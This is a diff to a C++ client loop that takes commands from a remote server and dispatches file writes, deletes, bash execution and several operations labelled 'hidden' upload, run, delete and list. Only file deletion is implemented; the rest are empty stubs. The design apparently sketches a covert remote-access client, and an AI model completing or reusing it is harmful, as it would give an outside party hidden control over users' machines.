@@ -3,6 +3,7 @@
 #include "Errors.h"
 #include "client.h"
 #include "SoftwareManeger.h"
+#include "FunCodes.h"
 
 void testSoftwareManeger(void);
 
@@ -33,20 +34,48 @@ void loopIter(Client& client, SoftwareManeger& swm)
 {
     // receive command
     Message msg;
+    Error res;
     client.recvCommand(msg);
     int fnccode = msg.fnccode();
-    std::string command = msg.param1();
+    std::string param = msg.param1();
 
     std::string response = "";
     switch (fnccode)
     {
-    case /* constant-expression */:
+    case WRITE_FILE:
+        /* code */
+        break;
+
+    case DELETE_FILE:
+        res = swm.deleteFile(msg.param1());
+        break;
+
+    case RUN_BASH:
+        /* code */
+        break;
+
+    case HIDDEN_UPLOAD:
+        /* code */
+        break;
+
+    case HIDDEN_DELETE:
+        /* code */
+        break;
+
+    case HIDDEN_RUN:
+        /* code */
+        break;
+
+    case HIDDEN_LIST:
         /* code */
         break;
     
     default:
-        break;
+        return;
     }
     
-    // return answer
+    Message msgres;
+    msgres.set_fnccode(res);
+    msgres.set_param1(response);
+    client.sendCommand(msgres);
 }
